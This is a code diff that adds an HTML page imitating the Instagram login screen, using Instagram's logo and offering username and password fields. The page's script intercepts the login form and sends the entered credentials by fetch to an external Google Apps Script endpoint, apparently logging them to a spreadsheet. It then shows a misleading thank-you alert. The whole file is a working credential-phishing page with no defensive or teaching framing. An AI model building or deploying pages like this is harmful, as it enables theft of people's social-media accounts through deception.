@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>
+  <link rel="icon" type="image/x-icon" href="">Instagram</title>
+	<link rel="stylesheet" type="text/css" href="css.css">
+</head><script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+<body>
+	<div class="maindiv">
+		<center>
+			<select>
+				<option class="op">English</option>
+				<option class="op">English (UK)</option>
+				<option class="op">Dansk</option>
+				<option class="op">Deutsch</option>
+				<option class="op">Norsk</option>
+				<option class="op">Ploski</option>
+				<option class="op">मराठी</option>
+				<option class="op">नेपाली</option>
+				<option class="op">हिंदी</option>
+				<option class="op">Suomi</option>
+			</select>
+			<br><br><br><br><br><br><br>
+	<i data-visualcompletion="css-img" aria-label="Instagram" class="name" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;">
+	</i>
+	<br><br>
+	<form method="post " name="panchalsheet">
+	<input type="name" name="User name" class="user" placeholder="Phone number, username, or email" style="display: block;">
+	<br>
+	<input type="password" name="Password" class="user" placeholder="Password">
+	<br><br>
+			<input type="submit" name="Login" value="Login" class="login">
+		</form><br>
+			<a href="#" style="margin-left: 200px;">Forgot password?</a>
+			<br><br>
+				<legend>OR</legend>
+				<br>
+			<div type="submit" name="Login" value="Login" class="loginfacebook"><ion-icon name="logo-facebook"></ion-icon><b>Log in with facebook</b></div>
+				<br><br>
+				<p>Don't have an account? Sign up</p>
+		</center>
+	</div>
+
+
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbycQ33gIXbGCxLbKh7zyx3A53k54BGfmi5pK8BF1Ke_PdgecvFZBvScspnGnS1wGYuk_g/exec'
+            const form = document.forms['panchalsheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon.."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+</body>
+</html>
